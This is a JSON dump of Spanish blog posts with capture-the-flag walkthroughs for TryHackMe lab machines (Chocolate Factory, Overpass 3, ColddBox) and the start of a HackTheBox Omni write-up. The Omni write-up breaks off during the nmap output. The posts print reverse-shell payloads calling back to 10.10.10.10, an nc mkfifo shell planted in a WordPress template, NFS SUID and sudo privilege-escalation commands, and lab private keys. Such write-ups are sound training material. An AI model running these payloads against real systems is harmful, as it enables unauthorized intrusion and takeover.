b\u0026#39;-VkgXhFf6s[... REDACTED ...]BXeQuvhcGSQzY=\u0026#39; Keep its safe Bad name! ;*3$\u0026#34; GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0 crtstuff.c [... REDACTED ...] kali@kali:~/thm/chocolat$chmod +x key_rev_key kali@kali:~/thm/chocolat$./key_rev_key Enter your name: laksdhfas congratulations you have found the key: b\u0026#39;-VkgXhFf6sAEc[... REDACTED ...]eQuvhcGSQzY=\u0026#39; kali@kali:~/thm/chocolat$  HTTP Encontramos una pagina web con un simple login.\nRUSTBUSTER Utilizamos rustbuster para busqueda de directorios y archivos pero no encontramos mucho.\n1 2 3 4 5 6 7 8 9 10 11  ~ rustbuster v3.0.3 ~ by phra \u0026amp; ps1dr3x ~ [?] Started at : 2021-01-19 21:13:28 GET 200 OK http://chocolat.thm/ GET 200 OK http://chocolat.thm/home.php GET 200 OK http://chocolat.thm/index.html GET 200 OK http://chocolat.thm/index.html GET 403 Forbidden http://chocolat.thm/server-status [?] Ended at: 2021-01-19 21:19:03   WWW-DATA - USER Utilizamos las credenciales de charlie y logramos ingresar, al ingresar nos muestra un input donde es posible ejecutar comandos.\nEjecutamos una shell inversa y logramos obtener una shell con el usuario www-data.\nCHARLIE - USER Dentro de la carpeta de charlie encontramos su clave privada de SSH la cual utilizamos para obtener acceso.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33  www-data@chocolate-factory:/home/charlie$ ls -lah ls -lah total 40K drwxr-xr-x 5 charlie charley 4.0K Oct 7 16:14 . drwxr-xr-x 3 root root 4.0K Oct 1 12:08 .. -rw-r--r-- 1 charlie charley 3.7K Apr 4 2018 .bashrc drwx------ 2 charlie charley 4.0K Sep 1 17:17 .cache drwx------ 3 charlie charley 4.0K Sep 1 17:17 .gnupg drwxrwxr-x 3 charlie charley 4.0K Sep 29 18:08 .local -rw-r--r-- 1 charlie charley 807 Apr 4 2018 .profile -rw-r--r-- 1 charlie charley 1.7K Oct 6 17:13 teleport -rw-r--r-- 1 charlie charley 407 Oct 6 17:13 teleport.pub -rw-r----- 1 charlie charley 39 Oct 6 17:11 user.txt www-data@chocolate-factory:/home/charlie$ ls -ld . ls -ld . drwxr-xr-x 5 charlie charley 4096 Oct 7 16:14 . www-data@chocolate-factory:/home/charlie$ cat user.txt cat user.txt cat: user.txt: Permission denied www-data@chocolate-factory:/home/charlie$ cat teleport cat teleport -----BEGIN RSA PRIVATE KEY----- MIIEowIBAAKCAQEA4adrPc3Uh98RYDrZ8CUBDgWLENUybF60lMk9YQOBDR+gpuRW 1AzL12K35/Mi3Vwtp0NSwmlS7ha4y9sv2kPXv8lFOmLi1FV2hqlQPLw/unnEFwUb L4KBqBemIDefV5pxMmCqqguJXIkzklAIXNYhfxLr8cBS/HJoh/7qmLqrDoXNhwYj [ ... REDACTED ... ] 37MWAz9nqSTza31dRSTh1+NAq0OHjTpkeAx97L+YF5KMJToXMqTIDS+pgA3fRamv ySQ9XJwpuSFFGdQb7co73ywT5QPdmgwYBlWxOKfMxVUcXybW/9FoQpmFipHsuBjb Jq4xAoGBAIQnMPLpKqBk/ZV+HXmdJYSrf2MACWwL4pQO9bQUeta0rZA6iQwvLrkM Qxg3lN2/1dnebKK5lEd2qFP1WLQUJqypo5TznXQ7tv0Uuw7o0cy5XNMFVwn/BqQm G2QwOAGbsQHcI0P19XgHTOB7Dm69rP9j1wIRBOF7iGfwhWdi+vln -----END RSA PRIVATE KEY----- www-data@chocolate-factory:/home/charlie$   Acceso a atraves del servicio ssh logramos obtener una shell y nuestra flag user.txt.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion con sudo -l -l y vemos que tenemos permisos root (sudo) para ejecutar el comando vi. Utilizamos vi para obtener una shell root.\nEncontramos el archivo root.py el cual pide una clave para poder desencrpitar nuestra flag, intentamos ejecutarlo en la maquina pero mostraba error, por lo que ejecutamos el archivo localmente eliminando lo innecesario y reparando el error (bytes en variable encrypted_mess).\n1 2 3 4 5 6 7 8  from cryptography.fernet import Fernet f = Fernet(\u0026#39;-VkgXhFf6sAEcA[... REDACTED ...]ABXeQuvhcGSQzY=\u0026#39;) encrypted_mess = b\u0026#39;gAAAAABfdb52eejIlEaE9ttPY8ckMMfHTIw5l[... REDACTED ...]_xbIQkQojwf_unpPAAKyJQDHNvQaJ\u0026#39; dcrypt_mess = f.decrypt(encrypted_mess) mess = dcrypt_mess.decode() print(mess)   Ejecutamos el script y logramos obtener nuestra flag root.txt.\nEs posible de manera rapida con la clave (key) y token desencriptar la informacion con Fernet (Decode).\n","description":"Chocolate Factory es una maquina de TryHackMe, obtuvimos acceso a un portal crackeando un contraseñas de un backup de shadow, ejecutamos una shell inversa y obtuvimos acceso por SSH con una clave privada. Escalamos privilegios utilizando Sudo junto con Vi y finalmente para obtener nuestra ultima flag utilizamos Python.","id":23,"section":"posts","tags":["Fernet","ftp","steghide","steganography","john"],"title":"TryHackMe - Chocolate Factory","uri":"https://sckull.github.io/posts/chocolatfactory/"},{"content":"  Overpass 3 - Hosting es una maquina de TryHackMe, es una serie de maquinas las cuales envuelven diferentes retos, en esta se presentan retos web y enumeracion para obtener acceso y credenciales para acceder al siguiente usuario. Se obtuvo el puerto NFS localmente donde obtuvimos la clave privada para SSH de otro usuario. Finalmente escalamos privilegios con Bash.\nRoom    Titulo Overpass 3 - Hosting      Descripción You know them, you love them, your favourite group of broke computer science students have another business venture! Show them that they probably should hire someone for security\u0026hellip;   Puntos 190   Dificultad Media   Maker NinjaJc01     NMAP Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), ssh (22) y el puerto http (80) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  # Nmap 7.80 scan initiated Mon Jan 11 20:08:53 2021 as: nmap -p- --min-rate 1000 -o allPorts overpass.thm Nmap scan report for overpass.thm (10.10.61.206) Host is up (0.36s latency). Not shown: 65532 filtered ports PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 80/tcp open http # Nmap done at Mon Jan 11 20:11:05 2021 -- 1 IP address (1 host up) scanned in 132.11 seconds # Nmap 7.80 scan initiated Mon Jan 11 20:11:31 2021 as: nmap -p 21,22,80 -sV -sC -o servicePorts overpass.thm Nmap scan report for overpass.thm (10.10.61.206) Host is up (0.31s latency). PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 8.0 (protocol 2.0) | ssh-hostkey: | 3072 de:5b:0e:b5:40:aa:43:4d:2a:83:31:14:20:77:9c:a1 (RSA) | 256 f4:b5:a6:60:f4:d1:bf:e2:85:2e:2e:7e:5f:4c:ce:38 (ECDSA) |_ 256 29:e6:61:09:ed:8a:88:2b:55:74:f2:b7:33:ae:df:c8 (ED25519) 80/tcp open http Apache httpd 2.4.37 ((centos)) | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Apache/2.4.37 (centos) |_http-title: Overpass Hosting Service Info: OS: Unix Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Jan 11 20:11:48 2021 -- 1 IP address (1 host up) scanned in 17.54 seconds   HTTP Encontramos una pagina web en el puerto 80 donde vemos una descripcion de la \u0026ldquo;empresa\u0026rdquo; y de algunos posibles usuarios.\nRUSTBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  kali@kali:~/thm/overpass3$ /opt/rustbuster/rustbuster dir -u http://overpass.thm/ -w /usr/share/wordlists/dirb/common.txt -t 35 -e php,html,txt ~ rustbuster v3.0.3 ~ by phra \u0026amp; ps1dr3x ~ _ _ _ _ _ _ _ _ _ _ /\\ \\  /\\_\\  / /\\  /\\ \\  / /\\  /\\_\\  / /\\  /\\ \\  /\\ \\  /\\ \\  / \\ \\/ / / _ / / \\  \\_\\ \\  / / \\  / / / _ / / \\  \\_\\ \\  / \\ \\  / \\ \\  / /\\ \\ \\ \\ \\__ /\\_\\/ / /\\ \\__ /\\__ \\  / / /\\ \\  \\ \\ \\__ /\\_\\/ / /\\ \\__ /\\__ \\  / /\\ \\ \\  / /\\ \\ \\  / / /\\ \\_\\ \\___\\  / / / / /\\ \\___\\/ /_ \\ \\  / / /\\ \\ \\  \\ \\___\\  / / / / /\\ \\___\\/ /_ \\ \\  / / /\\ \\_\\  / / /\\ \\_\\  / / /_/ / /\\__ / / / /\\ \\ \\ \\/___/ / /\\ \\ \\/ / /\\ \\_\\ \\  \\__ / / / /\\ \\ \\ \\/___/ / /\\ \\ \\/ /_/_ \\/_/ / / /_/ / / / / /__\\/ / / / / / / / \\ \\ \\  / / / \\/_/ / /\\ \\ \\___\\ / / / / / / \\ \\ \\  / / / \\/_/ /____/\\  / / /__\\/ / / / /_____/ / / / / / _ \\ \\ \\  / / / / / / \\ \\ \\__// / / / / _ \\ \\ \\  / / / / /\\____\\/ / / /_____/ / / /\\ \\ \\  / / /___/ / /_/\\__/ / / / / / / / /____\\_\\ \\ / / /___/ / /_/\\__/ / / / / / / / /______ / / /\\ \\ \\  / / / \\ \\ \\/ / /____\\/ /\\ \\/___/ / /_/ / / / /__________/ / /____\\/ /\\ \\/___/ / /_/ / / / /_______/ / / \\ \\ \\  \\/_/ \\_\\/\\/_________/ \\_____\\/ \\_\\/ \\/_____________\\/_________/ \\_____\\/ \\_\\/ \\/__________\\/_/ \\_\\/ [?] Started at\t: 2021-01-11 20:14:34 GET\t403 Forbidden\thttp://overpass.thm/.html GET 200 OK http://overpass.thm/ GET 301 Moved Permanently http://overpass.thm/backups =\u0026gt; http://overpass.thm/backups/ GET 403 Forbidden http://overpass.thm/cgi-bin/ GET 403 Forbidden http://overpass.thm/cgi-bin/.html GET 200 OK http://overpass.thm/index.html GET 200 OK http://overpass.thm/index.html [00:02:33] ######################################## 18444/18444 ETA: 00:00:00 req/s: 120 [?] Ended at: 2021-01-11 20:17:08   Encontramos un directorio que contiene un archivo comprimido, este iñto,p tiene una clave y un archivo encriptado.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33  kali@kali:~/thm/overpass3$ wget http://overpass.thm/backups/backup.zip --2021-01-11 20:18:31-- http://overpass.thm/backups/backup.zip Resolving overpass.thm (overpass.thm)... 10.10.61.206 Connecting to overpass.thm (overpass.thm)|10.10.61.206|:80... connected. HTTP request sent, awaiting response... 200 OK Length: 13353 (13K) [application/zip] Saving to: ‘backup.zip’ backup.zip 100%[========================================================================================================================================\u0026gt;] 13.04K 50.1KB/s in 0.3s 2021-01-11 20:18:32 (50.1 KB/s) - ‘backup.zip’ saved [13353/13353] kali@kali:~/thm/overpass3$ unzip backup.zip Archive: backup.zip extracting: CustomerDetails.xlsx.gpg inflating: priv.key kali@kali:~/thm/overpass3$ ls allPorts backup.zip CustomerDetails.xlsx.gpg priv.key servicePorts kali@kali:~/thm/overpass3$ cat priv.key -----BEGIN PGP PRIVATE KEY BLOCK----- lQOYBF+oX7cBCADhibQ/m0CUX0DKreNOMaBiG6YNrkaRd5XKFfZ8cO+JbE57Yuao T3uhxN396ICsRBG7VGK03YZVwafMFxx0ItIEuV8n9nQ9K6WJg6od815J3UkkSMU4 TL6E+iGiAvYUtxwo2s/NqAdrUcAqoa9ImUxqHjJByNNpLbTcfKJKzZZEdVH6Iuo7 qLoKwNJLK427CpDqTFJmOLoRVH9XDSMaVaP5MT4qn18/iSJGpFJY/Qjv2RdgygiS [... SNIP ...] Aj7qgO6j7r2GkMwPiVlXQRW/dnhtNzvaS1ZR47R7YeFQuIIFiWnt+mamWrM3TN8x 5yeHVycXbFyRO121lKB0/q7f9dVFN8UY92F5cfMPUAOjM59P8Nsx3rFLUAhi7Fyo 5YeN91WwbAtRyc33YmwK/SpOVarOOdEvrGFK2z1Tq++RpqzuYFfnZ868NXJP+99Q wR1fzkFAFjEZIO+bteZLEzr9BCUI7FAyQofXMggwiuyuw/Prcema52nhJvA= =mr8q -----END PGP PRIVATE KEY BLOCK----- kali@kali:~/thm/overpass3$   Importamos la clave y desencriptamos el archivo, este ultimo contiene Nombres, usuarios, contraseñas e informacion de tarjetas de \u0026ldquo;credito\u0026rdquo;.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  kali@kali:~/thm/overpass3$ gpg --import priv.key gpg: /home/kali/.gnupg/trustdb.gpg: trustdb created gpg: key C9AE71AB3180BC08: public key \u0026#34;Paradox \u0026lt;paradox@overpass.thm\u0026gt;\u0026#34; imported gpg: key C9AE71AB3180BC08: secret key imported gpg: Total number processed: 1 gpg: imported: 1 gpg: secret keys read: 1 gpg: secret keys imported: 1 kali@kali:~/thm/overpass3$ gpg -d CustomerDetails.xlsx.gpg \u0026gt; file.xlsx gpg: encrypted with 2048-bit RSA key, ID 9E86A1C63FB96335, created 2020-11-08 \u0026#34;Paradox \u0026lt;paradox@overpass.thm\u0026gt;\u0026#34; kali@kali:~/thm/overpass3$ file file.xlsx file.xlsx: Microsoft Excel 2007+ kali@kali:~/thm/overpass3$   FTP Con las credenciales que encontramos intentamos ingresar por el servicio FTP donde logramos ver los archivos de la pagina y comprobar que tenemos permisos (con el primer usuario) de escritura, es por ello que comprobamos que el archivo shinji.php se muestra en la pagina.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40  kali@kali:~/thm/overpass3$ ftp overpass.thm Connected to overpass.thm. 220 (vsFTPd 3.0.3) Name (overpass.thm:kali): [SPOILER] 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls -lah 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxrwxrwx 3 48 48 94 Nov 17 23:54 . drwxrwxrwx 3 48 48 94 Nov 17 23:54 .. drwxr-xr-x 2 48 48 24 Nov 08 21:25 backups -rw-r--r-- 1 0 0 65591 Nov 17 20:42 hallway.jpg -rw-r--r-- 1 0 0 1770 Nov 17 20:42 index.html -rw-r--r-- 1 0 0 576 Nov 17 20:42 main.css -rw-r--r-- 1 0 0 2511 Nov 17 20:42 overpass.svg 226 Directory send OK. ftp\u0026gt; pwd 257 \u0026#34;/\u0026#34; is the current directory ftp\u0026gt; cd backups 250 Directory successfully changed. ftp\u0026gt; ls -lah 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 2 48 48 24 Nov 08 21:25 . drwxrwxrwx 3 48 48 94 Nov 17 23:54 .. -rw-r--r-- 1 48 48 13353 Nov 08 21:24 backup.zip 226 Directory send OK. ftp\u0026gt; cd .. 250 Directory successfully changed. ftp\u0026gt; put shinji.php local: shinji.php remote: shinji.php 200 PORT command successful. Consider using PASV. 150 Ok to send data. 226 Transfer complete. 25 bytes sent in 0.00 secs (305.1758 kB/s) ftp\u0026gt;   APACHE - USER Subimos una shell inversa (ya que el servicio SSH no nos permitió ingresar), la \u0026ldquo;ejecutamos\u0026rdquo; y logramos obtener una shell con el usuario Apache y nuestra flag web.flag.\n1 2 3  \u0026lt;?php exec(\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.10.10/1338 0\u0026gt;\u0026amp;1\u0026#34;); ?\u0026gt;   PARADOX - USER Utilizando la contraseña de paradox logramos obtener una shell con este utilizando su, pero al parecer la consola esta \u0026ldquo;limitada\u0026rdquo; por lo que agregamos nuestra clave publica al archivo authorized_keys para poder ingresar por el servicio SSH y obtener una shell más comoda.\n1 2 3 4 5 6 7 8 9 10 11 12  pwd /home/paradox/.ssh ls -lah total 8.0K drwx------ 2 paradox paradox 47 Nov 18 18:32 . drwx------. 4 paradox paradox 203 Nov 18 18:29 .. -rw------- 1 paradox paradox 583 Nov 18 18:29 authorized_keys -rw-r--r-- 1 paradox paradox 583 Nov 18 18:29 id_rsa.pub echo \u0026#34;ssh-rsa AAAAB3NzaC1yc2EAAAAD[... snip ...]EA8NHz17TjX/NsxObr9Q6ziiRgIc= kali@kali\u0026#34; \u0026gt;\u0026gt; authorized_keys tail authorized_keys ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB[... snip ...]8NHz17TjX/NsxObr9Q6ziiRgIc= kali@kali   JAMES NFS - USER Enumeramos la maquina y encontramos puertos locales que no aparecen abiertos en nmap o aparecen filtrados, puertos que pertenecen RPC (111), NFS (2049) y MOUNTD (20048), al revisar si existia un punto de acceso encontramos la carpeta principal de James: /home/james, y que, cualquiera tiene acceso. Pero existe un problema, estos puertos solo estan disponibles de manera local y para montar este punto de acceso es necesario privilegios root, es por eso que debemos de llevar estos puertos a nuestra maquina para poder montar el punto de acceso, poder listar y montarlo tal cual como lo muestra showmount -e dentro de la maquina (/home/james). Para ello utilizamos chisel (ya que SSH no me permitia obtener el puerto 111) y SSH.\n1 2 3 4 5 6 7 8  #CHISEL en Overpass ./chisel client 10.2.29.162:8080 R:111:127.0.0.1:111 #Chisel en nuestra maquina ./chisel server -p 8080 --reverse #SSH en nuestra maquina ssh -L 2049:127.0.0.1:2049 -L 20048:127.0.0.1:20048 paradox@overpass.thm   En caso de que nuestra maquina no acepte el puerto 111 hay que parar el servicio rpcbind\n1 2  systemctl stop rpcbind systemctl stop rpcbind.socket   Revisamos que los puertos estan localmente y que existe el punto de acceso con showmount.\nCreamos una carpeta, montamos el punto de acceso con mount.\n1 2 3 4 5  #Creamos una carpeta mkdir jamesstuff #MOUNT sudo mount -o nolock -t nfs localhost:/home/james /home/kali/thm/overpass3/jamesstuff/   Logramos obtener acceso a los archivos de James, nuestra flag user.txt y su clave privada de SSH la cual utilizamos para obtener una shell con este usuario.\nPRIVILEGE ESCALATION Ya que tenemos acceso a la carpeta de James a traves de NFS vamos a copiar bash con permisos root o SUID.\n1 2  cp /bin/bash . chmod +s bash   Ya que tenemos acceso a la maquina con el usuario James ejecutamos bash -p para obtener una shell con el usuario root y nuestra flag root.txt.\nNFS - UPDATE No era necesario obtener el puerto 111 y 20048, solo el puerto 2049 y montar directamente localhost:/ a la carpeta especificada.\n1 2 3 4 5  #SSH - Puerto 2049 ssh -L 2049:127.0.0.1:2049 paradox@overpass.thm #Mount sudo mount -t nfs localhost:/ /home/kali/thm/overpass3/jamesstuff/   Links útiles:\n Linux Privilege Escalation using Misconfigured NFS NFS access  ","description":"Overpass 3 - Hosting es una maquina de TryHackMe, es una serie de maquinas las cuales envuelven diferentes retos, en esta se presentan retos web y enumeracion para obtener acceso y credenciales para acceder al siguiente usuario. Se obtuvo el puerto NFS localmente donde obtuvimos la clave privada para SSH de otro usuario. Finalmente escalamos privilegios con Bash.","id":24,"section":"posts","tags":["nfs","rpc","rustbuster","ftp","chisel","mount"],"title":"TryHackMe - Overpass 3 - Hosting","uri":"https://sckull.github.io/posts/overpass3/"},{"content":"  ColddBox: Easy es una maquina de TryHackMe, realizamos un ataque de contraseñas en WordPress con usuariois encontrados en WPScan, lo que nos dio acceso a la maquina. Realizamos movimiento lateral con credenciales encontradas en archivo de configuracion de WordPress. Para escalar privilegios encontramos multiples opciones.\nRoom    Titulo ColddBox: Easy      Descripción An easy level machine with multiple ways to escalate privileges.   Puntos 60   Dificultad Facil   Maker C0ldd     NMAP Escaneo de puertos tcp, nmap nos muestra el puerto http (80) y el puerto 4512 abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  # Nmap 7.80 scan initiated Mon Jan 11 02:28:35 2021 as: nmap -p- --min-rate 1000 -o allports cold.thm Warning: 10.10.77.71 giving up on port because retransmission cap hit (10). Nmap scan report for cold.thm (10.10.77.71) Host is up (0.34s latency). Not shown: 65026 closed ports, 507 filtered ports PORT STATE SERVICE 80/tcp open http 4512/tcp open unknown # Nmap done at Mon Jan 11 02:31:05 2021 -- 1 IP address (1 host up) scanned in 149.46 seconds # Nmap 7.80 scan initiated Mon Jan 11 02:42:32 2021 as: nmap -sV -sC -p80,4512 -o servicePorts cold.thm Nmap scan report for cold.thm (10.10.77.71) Host is up (0.31s latency). PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-generator: WordPress 4.1.31 |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: ColddBox | One more machine 4512/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 4e:bf:98:c0:9b:c5:36:80:8c:96:e8:96:95:65:97:3b (RSA) | 256 88:17:f1:a8:44:f7:f8:06:2f:d3:4f:73:32:98:c7:c5 (ECDSA) |_ 256 f2:fc:6c:75:08:20:b1:b2:51:2d:94:d6:94:d7:51:4f (ED25519) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Jan 11 02:42:50 2021 -- 1 IP address (1 host up) scanned in 18.69 seconds   El puerto 4512 esta corriendo el servicio SSH lo comprobamos utilizando netcat.\n1 2 3 4  kali@kali:~/thm/colddbox$ nc cold.thm 4512 SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.10 ^C kali@kali:~/thm/colddbox$   HTTP Encontramos una pagina en el puerto 80 que a simple vista podemos ver que es WordPress, ejecutamos wpscan, logramos obtener algunos nombres de usuarios y la version de WordPress:4.1.31 .\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  [... snip ...] [i] User(s) Identified: [+] the cold in person | Found By: Rss Generator (Passive Detection) [+] c0ldd | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) [+] hugo | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) [+] philip | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) [... snip ...]   GOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7 8 9 10 11 12 13  kali@kali:~/thm/colddbox$ gobuster dir -u http://cold.thm/ -w /usr/share/wordlists/dirb/big.txt -q -t 35 -x php,html,txt /hidden (Status: 301) /index.php (Status: 301) /license.txt (Status: 200) /readme.html (Status: 200) /server-status (Status: 403) /wp-admin (Status: 301) /wp-content (Status: 301) /wp-config.php (Status: 200) /wp-includes (Status: 301) /wp-login.php (Status: 200) /wp-trackback.php (Status: 200) /xmlrpc.php (Status: 200)   WWW-DATA - USER En el resultado de GOBUSTER vemos una pagina que contiene un mensaje donde indica que C0ldd cambio la contraseña de hugo y que no puede editar articulos en la pagina. Realizamos una busqueda de directorios y paginas en esta ultima direccion pero no obtuvimos resultados, por lo que realizamos un ataque de fuerza bruta con hydra al panel de wordpress con los usuarios encontrados.\nLogramos obtener una contraseña de uno de los usuarios, mismo usuario que tiene permisos de administrador, editamos el archivo 404.php para ejecutar una shell inversa.\n1  exec(\u0026#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.10.10.10 1338 \u0026gt;/tmp/f\u0026#39;);   \u0026ldquo;Ejecutamos\u0026rdquo; nuestra shell generando un \u0026ldquo;error\u0026rdquo; en la pagina, en mi caso cambiando el numero de Post a 2 en la URL para generar un error, logrando obtener una shell con el usuario www-data.\nC0LDD - USER Dentro de la maquina realizamos una enumeracion y logramos encontrar usuario y contraseña de la base de datos de WordPress, dicho usuario está registrado en la maquina por lo que intentamos utilizar esta contraseña y logramos obtener una shell con este usuario y nuestra flag user.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  // ** MySQL settings - You can get this info from your web host ** // /** The name of the database for WordPress */ define(\u0026#39;DB_NAME\u0026#39;, \u0026#39;[REDACTED]\u0026#39;); /** MySQL database username */ define(\u0026#39;DB_USER\u0026#39;, \u0026#39;[REDACTED]\u0026#39;); /** MySQL database password */ define(\u0026#39;DB_PASSWORD\u0026#39;, \u0026#39;[REDACTED]\u0026#39;); /** MySQL hostname */ define(\u0026#39;DB_HOST\u0026#39;, \u0026#39;localhost\u0026#39;); /** Database Charset to use in creating database tables. */ define(\u0026#39;DB_CHARSET\u0026#39;, \u0026#39;utf8\u0026#39;); /** The Database Collate type. Don\u0026#39;t change this if in doubt. */ define(\u0026#39;DB_COLLATE\u0026#39;, \u0026#39;\u0026#39;);   PRIVILEGE ESCALATION Hacemos una pequeña enumeracion con sudo -l -l y vemos que tenemos permisos root (sudo) para ejecutar el comando vim, chmod, ftp. Utilizamos GTFOBins para obtener una shell root. Es posible obtener una shell con los 3 comandos disponibles.\n Vim Chmod Ftp  1 2 3 4 5 6 7 8 9  #VIM sudo vim -c \u0026#39;:!/bin/sh\u0026#39; #CHMOD sudo chmod u+s /bin/bash #FTP sudo ftp !/bin/sh   ","description":"ColddBox: Easy es una maquina de TryHackMe, realizamos un ataque de contraseñas en WordPress con usuariois encontrados en WPScan, lo que nos dio acceso a la maquina. Realizamos movimiento lateral con credenciales encontradas en archivo de configuracion de WordPress. Para escalar privilegios encontramos multiples opciones.","id":25,"section":"posts","tags":["wordpress","hydra","wpscan","sudo privesc"],"title":"TryHackMe - ColddBox: Easy","uri":"https://sckull.github.io/posts/coldd/"},{"content":"  Omni es una maquina de HackTheBox diferente ya que encontramos un SO Windows IOT, descubrimos que existe una vulnerabilidad la cual aprovechamso para ejecutar una shell inversa. Enumerando diferentes archivos encontramos credenciales almacenadas que nos permitieron ingresar al Portal y obtener acceso privilegiado.\nInformacion de la Maquina    Nombre Omni      OS Other   Puntos 20   Dificultad Facil   IP 10.10.10.204   Maker egre55    Matrix   { \u0026quot;type\u0026quot;:\u0026quot;radar\u0026quot;, \u0026quot;data\u0026quot;:{ \u0026quot;labels\u0026quot;:[\u0026quot;Enumeration\u0026quot;,\u0026quot;Real-Life\u0026quot;,\u0026quot;CVE\u0026quot;,\u0026quot;Custom Explotation\u0026quot;,\u0026quot;CTF-Like\u0026quot;], \u0026quot;datasets\u0026quot;:[ { \u0026quot;label\u0026quot;:\u0026quot;User Rate\u0026quot;, \u0026quot;data\u0026quot;:[6.3, 5.6, 5.8, 4.2, 4.4], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(75, 162, 189,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#4ba2bd\u0026quot; }, { \u0026quot;label\u0026quot;:\u0026quot;Maker Rate\u0026quot;, \u0026quot;data\u0026quot;:[5, 8, 8, 2, 2], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(154, 204, 20,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#9acc14\u0026quot; } ] }, \u0026quot;options\u0026quot;: {\u0026quot;scale\u0026quot;: {\u0026quot;ticks\u0026quot;: {\u0026quot;backdropColor\u0026quot;:\u0026quot;rgba(0,0,0,0)\u0026quot;}, \u0026quot;angleLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;}, \u0026quot;gridLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;} } } }     NMAP Escaneo de puertos tcp, nmap nos muestra el puerto smb (445), ldap (139) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40  # Nmap 7.80 scan initiated Sat Sep 12 16:50:46 2020 as: nmap -Pn -p- --min-rate 1000 -o allports omni.htb Nmap scan report for omni.htb (10.10.10.204) Host is up (0.15s latency). Not shown: 65529 filtered ports PORT STATE SERVICE 135/tcp open msrpc 5985/tcp open wsman 8080/tcp open http-proxy 29817/tcp open unknown 29819/tcp open unknown 29820/tcp open unknown # Nmap done at Sat Sep 12 16:54:03 2020 -- 1 IP address (1 host up) scanned in 197.08 seconds # Nmap 7.80 scan initiated Sat Sep 12 16:54:52 2020 as: nmap -Pn -sV -sC -p 135,5985,8080,29817,29819,29820 -o servicesport omni.htb Nmap scan report for omni.htb (10.10.10.204) Host is up (0.066s latency). PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 5985/tcp open upnp Microsoft IIS httpd 8080/tcp open upnp Microsoft IIS httpd | http-auth: | HTTP/1.1 401 Unauthorized\\x0D |_ Basic realm=Windows Device Portal |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Site doesn\u0026#39;t have a title. 29817/tcp open unknown 29819/tcp open arcserve ARCserve Discovery 29820/tcp open unknown 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port29820-TCP:V=7.80%I=7%D=9/12%Time=5F5D35A3%P=x86_64-pc-linux-gnu%r(N SF:ULL,10,\u0026#34;\\*LY\\xa5\\xfb`\\x04G\\xa9m\\x1c\\xc9}\\xc8O\\x12\u0026#34;)%r(GenericLines,10,\u0026#34; SF:\\*LY\\xa5\\xfb`\\x04G\\xa9m\\x1c\\xc9}\\xc8O\\x12\u0026#34;)%r(Help,10,\u0026#34;\\*LY\\xa5\\xfb`\\x0 SF:4G\\xa9m\\x1c\\xc9}\\xc8O\\x12\u0026#34;)%r(JavaRMI,10,\u0026#34;\\*LY\\xa5\\xfb`\\x04G\\xa9m\\x1c\\x SF:c9}\\xc8O\\x12\u0026#34;); Service Info: Host: PING; OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at 